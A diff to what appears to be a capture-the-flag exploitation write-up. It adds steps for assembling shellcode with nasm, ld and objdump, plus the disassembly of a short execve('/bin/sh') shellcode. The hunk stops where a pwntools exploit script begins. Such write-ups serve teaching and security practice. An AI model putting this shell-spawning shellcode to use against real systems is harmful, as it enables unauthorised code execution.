@@ -175,6 +175,29 @@ gef➤  x/7i $rip
    0x7fc1735c6099:	syscall 
 ```
 
+Also to assemble the assembly code into opcodes, I just used nasm. Here's an example assembling the assembly file `shellcode.asm`
+
+```
+$	nasm -f elf64 shellcode.asm
+$	ld -o shellcode shellcode.o
+$	objdump -D shellcode -M intel
+
+shellcode:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000400080 <_start>:
+  400080:	b0 3b                	mov    al,0x3b
+  400082:	48 8d 3d f8 ff ff ff 	lea    rdi,[rip+0xfffffffffffffff8]        # 400081 <_start+0x1>
+  400089:	48 b9 2f 62 69 6e 2f 	movabs rcx,0x68732f6e69622f
+  400090:	73 68 00 
+  400093:	48 89 0f             	mov    QWORD PTR [rdi],rcx
+  400096:	48 31 f6             	xor    rsi,rsi
+  400099:	48 31 d2             	xor    rdx,rdx
+  40009c:	0f 05                	syscall 
+```
+
 Putting it all together, we get the following exploit:
 ```
 from pwn import *
